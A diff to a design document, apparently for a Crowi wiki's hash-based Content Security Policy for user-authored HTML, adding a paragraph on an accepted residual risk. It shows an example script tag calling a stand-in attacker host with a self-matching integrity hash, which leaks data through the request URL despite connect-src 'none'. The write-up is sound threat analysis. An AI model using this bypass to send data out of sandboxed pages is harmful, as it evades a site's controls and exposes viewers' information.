@@ -162,6 +162,8 @@ The two font origins in brackets are present only when the web-font setting is e
 
 A hash has no such property. `'sha256-…'` matches one exact body of inline code and nothing else, so an attacker-authored element — external or inline — matches no hash and does not run. Ingest computes the digest of each accepted inline block and records it in a reserved `<meta>`; delivery reads those markers and emits the hashes, still serving the stored bytes unchanged. No attribute is injected onto the blocks themselves.
 
+One residual remains, and it is accepted rather than closed. CSP Level 3 lets a hash-source in `script-src` also match an *external* `<script>` whose `integrity` attribute carries the same hash, and the policy must not rely on browsers declining to implement that. An accepted inline script can therefore append `<script src="https://attacker.example/x.js" integrity="sha256-<its own digest>">` at runtime, and the browser issues that request even under `connect-src 'none'`. Subresource integrity then refuses to run anything but the identical bytes, so no new code executes; what escapes is the request itself, with whatever the script encoded into the URL and the viewer's IP and user agent. No directive closes this path: a nonce is readable by the script that carries it and is strictly weaker, and Trusted Types would break most existing libraries. It is accepted because it takes a deliberately hostile author, exposes only what the artifact itself already knows, cannot reach the Crowi session or API, and is no worse than what an ordinary Markdown page can already do with an external image.
+
 **The digests are recorded per kind, in two markers.** Ingest appends both to the end of `head`:
 
 ```html
